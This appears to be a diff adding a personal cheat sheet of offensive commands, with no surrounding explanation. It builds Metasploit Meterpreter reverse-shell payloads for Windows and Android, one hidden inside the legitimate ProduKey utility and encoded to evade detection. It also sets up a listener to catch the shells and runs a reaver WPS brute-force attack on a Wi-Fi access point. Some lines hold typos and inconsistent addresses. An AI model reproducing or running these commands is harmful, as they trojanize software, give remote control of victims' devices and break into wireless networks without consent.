@@ -1,0 +1,16 @@
+wget http://www.nisoft.net/utils/produkey.zip
+mfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 1 -t exe -x ./ProduKey.exe -p /tmp/Produkey.exe
+msf> use exploit/multi/handler
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.0.12
+msf> set LPORT 443
+msf> run
+---------------------------------------------------
+Android:msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT= 4000 =D R> /var/www/html/sas.apk
+---------------------------------------------------
+Windows:
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f exe -o /home/nivaldo/Nivaldo.exe
+-------------------------------------------------
+reaver -i wlp4s0mon -b C0:25:E9:97:45:F8  -vv -K 3
+
+
